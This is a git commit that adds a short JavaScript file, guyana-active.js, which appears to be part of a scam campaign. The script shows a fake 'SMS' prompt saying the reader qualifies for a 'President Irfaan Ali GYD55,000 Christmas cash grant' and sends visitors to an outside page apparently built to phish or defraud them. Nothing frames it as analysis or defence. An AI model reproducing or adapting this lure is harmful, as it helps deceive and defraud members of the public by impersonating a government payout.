7a64a57083b08d9d9277f152596a040702914648
boss-bloq <nsisboy01@gmail.com>
2024-12-08 23:10:18 -0800

    Create guyana-active.js

---
+++ guyana-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW GYD55,000'
+password=prompt('SMS: Congratulations You are qualify for President IRFAAN ALI GYD55,000 CHRISTMAS CASH GRANT FOR GUYANESE, Kindly Press OK to Withdraw X-MAS Cash Grant   ','WITHDRAW GYD55,000');
+if (password != 'WITHDRAW GYD55,000') {
+location.href='https://damba-fest.org/guyana-grant.html';
+}
